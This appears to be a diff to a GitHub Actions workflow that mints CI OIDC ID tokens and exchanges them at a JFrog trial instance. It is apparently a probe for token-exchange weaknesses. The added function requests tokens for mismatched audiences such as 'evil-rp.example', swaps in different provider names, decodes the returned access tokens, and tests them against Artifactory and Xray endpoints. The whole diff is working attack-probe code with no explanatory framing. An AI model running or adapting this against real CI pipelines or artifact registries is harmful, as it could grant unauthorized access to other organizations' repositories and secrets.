@@ -10,10 +10,16 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |
-          T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=jfrog-github" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
-          curl -s -o /tmp/o -w 'HTTP %{http_code}\n' -X POST -H 'Content-Type: application/json' -d "{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:id_token\",\"subject_token\":\"$T\",\"provider_name\":\"sanhacks2/r1pin@github\"}" https://trialuakwcj.jfrog.io/access/api/v1/oidc/token
-          J=$(python3 -c 'import json;print(json.load(open("/tmp/o")).get("access_token",""))')
-          echo "$J" | python3 -c 'import sys,json,base64;p=sys.stdin.read().split(".")[1];p+="="*(-len(p)%4);d=json.loads(base64.urlsafe_b64decode(p));print("JFROG", {k:d.get(k) for k in ("sub","scp","aud","exp","iat")})'
-          for U in /artifactory/api/repositories /xray/api/v1/system/version /access/api/v1/tokens/me /lifecycle/api/v2/release_bundle/names /onemodel/api/v1/graphql; do
-            C=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $J" https://trialuakwcj.jfrog.io$U); echo "HTTP svc $U $C"
-          done
+          ex() { A=$1; P=$2
+            T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$A" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+            if [ -n "$P" ]; then B="{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:id_token\",\"subject_token\":\"$T\",\"provider_name\":\"$P\"}"; else B="{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:id_token\",\"subject_token\":\"$T\"}"; fi
+            echo "### aud=$A provider=${P:-NONE}"
+            curl -s -o /tmp/o -w 'HTTP %{http_code}\n' -X POST -H 'Content-Type: application/json' -d "$B" https://trialuakwcj.jfrog.io/access/api/v1/oidc/token
+            python3 -c 'import json,base64;b=open("/tmp/o").read();d=json.loads(b) if b.startswith("{") else {};t=d.get("access_token");p=(t.split(".")[1]+"==") if t else "";c=json.loads(base64.urlsafe_b64decode(p)) if t else {};print("JFROG", {k:c.get(k) for k in ("sub","scp","aud")}) if t else print("BODY",b[:200])'
+            J=$(python3 -c 'import json;b=open("/tmp/o").read();print(json.loads(b).get("access_token","") if b.startswith("{") else "")')
+            [ -n "$J" ] && for U in /artifactory/api/repositories /xray/api/v1/system/version; do echo "HTTP svc $U $(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $J" https://trialuakwcj.jfrog.io$U)"; done
+          }
+          ex jfrog-github sanhacks2/r1pin@github
+          ex evil-rp.example ""
+          ex evil-rp.example r2audgh
+          ex r2aud r2audgh
